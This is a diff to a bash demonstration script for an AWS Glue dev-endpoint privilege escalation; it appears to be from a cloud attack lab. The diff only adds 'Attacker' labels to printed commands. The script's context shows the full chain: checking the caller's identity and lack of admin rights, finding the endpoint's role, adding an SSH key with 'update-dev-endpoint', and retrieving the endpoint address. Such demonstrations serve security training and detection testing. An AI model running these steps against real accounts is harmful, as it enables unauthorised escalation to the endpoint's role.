@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -103,7 +105,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -115,7 +117,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -123,7 +125,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -135,7 +137,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Discovering existing Glue dev endpoint${NC}"
 echo "Listing Glue dev endpoints..."
 
-show_cmd "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.[EndpointName,Status,RoleArn]' --output text"
+show_cmd "Attacker" "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.[EndpointName,Status,RoleArn]' --output text"
 ENDPOINT_INFO=$(aws glue get-dev-endpoint \
     --region "$AWS_REGION" \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
@@ -184,7 +186,7 @@ echo "This is the privilege escalation vector - adding our SSH key to the endpoi
 echo "Endpoint: $DEV_ENDPOINT_NAME"
 echo ""
 
-show_attack_cmd "aws glue update-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --add-public-keys \"$SSH_PUBLIC_KEY\" --output json"
+show_attack_cmd "Attacker" "aws glue update-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --add-public-keys \"$SSH_PUBLIC_KEY\" --output json"
 aws glue update-dev-endpoint \
     --region "$AWS_REGION" \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
@@ -208,7 +210,7 @@ echo -e "${GREEN}✓ Update propagated${NC}\n"
 
 # Step 9: Get endpoint address
 echo -e "${YELLOW}Step 9: Retrieving dev endpoint connection details${NC}"
-show_cmd "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
+show_cmd "Attacker" "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --region "$AWS_REGION" \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
